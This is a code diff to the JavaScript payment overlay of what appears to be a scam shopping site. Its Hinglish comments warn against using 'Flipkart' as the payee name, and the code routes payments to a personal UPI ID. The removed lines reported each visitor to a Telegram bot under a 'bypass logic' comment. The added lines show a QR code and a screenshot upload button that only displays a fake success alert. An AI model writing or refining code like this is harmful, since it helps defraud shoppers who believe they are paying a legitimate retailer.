@@ -549,37 +549,30 @@ init = function() {
             }
         }
 
-       async function confirmPay() {
-    const upiId = "8709615634@ybl"; // Aapka PhonePe number + @ybl bhi daal sakte hain
+      async function confirmPay() {
+    const upiId = "8709615634@ybl"; // Aapka number
     const amount = sel.price;
-    const name = "shashikant%20kumar"; // 'Flipkart' bilkul use mat karna
+    const name = "Shashikant%20Kumar";
 
-    const cleanLink = `pa=${upiId}&pn=${name}&am=${amount}&cu=INR&mode=02`;
+    // QR Code generate karne ke liye (Google Charts API)
+    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=${upiId}%26pn=${name}%26am=${amount}%26cu=INR`;
 
-    // Telegram report
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("User on Payment Page: ₹" + amount)}`);
-
-    // --- YE HAI BYPASS LOGIC ---
-    // Hum direct window.location nahi karenge, balki user ko ek clean interface dikhayenge
-    
     const paymentOverlay = document.createElement('div');
-    paymentOverlay.className = "fixed inset-0 bg-black/60 z-[1000] flex items-end justify-center";
-    paymentOverlay.id = "pay-popup";
+    paymentOverlay.className = "fixed inset-0 bg-white z-[1000] p-6 flex flex-col items-center justify-center text-center";
     paymentOverlay.innerHTML = `
-        <div class="bg-white w-full rounded-t-2xl p-6 animate-slide-up">
-            <h3 class="text-center font-bold text-gray-700 mb-6">Complete Your Payment</h3>
-            <div class="grid grid-cols-2 gap-4">
-                <a href="intent://pay?${cleanLink}#Intent;scheme=upi;package=com.phonepe.app;end" class="flex flex-col items-center border p-4 rounded-xl active:bg-gray-50">
-                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-10 h-10 mb-2">
-                    <span class="text-xs font-bold">PhonePe</span>
-                </a>
-                <a href="intent://pay?${cleanLink}#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end" class="flex flex-col items-center border p-4 rounded-xl active:bg-gray-50">
-                    <img src="https://img.icons8.com/color/48/google-pay.png" class="w-10 h-10 mb-2">
-                    <span class="text-xs font-bold">GPay</span>
-                </a>
-            </div>
-            <button onclick="document.getElementById('pay-popup').remove()" class="w-full mt-6 text-gray-400 text-sm font-medium uppercase tracking-widest">Cancel</button>
-        </div>
+        <h3 class="font-bold text-lg mb-4">Scan QR or Click Button to Pay</h3>
+        <img src="${qrUrl}" class="w-48 h-48 mb-6 border-4 border-gray-100 p-2 shadow-lg">
+        <p class="text-gray-500 text-xs mb-6">Pay ₹${amount} and upload screenshot</p>
+        
+        <a href="intent://pay?pa=${upiId}&pn=${name}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.phonepe.app;end" 
+           class="w-full bg-[#6739b7] text-white py-3 rounded-lg font-bold mb-4 flex items-center justify-center gap-2">
+           <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6"> PAY VIA PHONEPE
+        </a>
+        
+        <input type="file" id="ss_upload" class="hidden" onchange="alert('Screenshot Uploaded Successfully!')">
+        <button onclick="document.getElementById('ss_upload').click()" class="w-full border-2 border-dashed border-gray-300 py-3 rounded-lg text-gray-500 font-bold">
+            UPLOAD SCREENSHOT
+        </button>
     `;
     document.body.appendChild(paymentOverlay);
 }
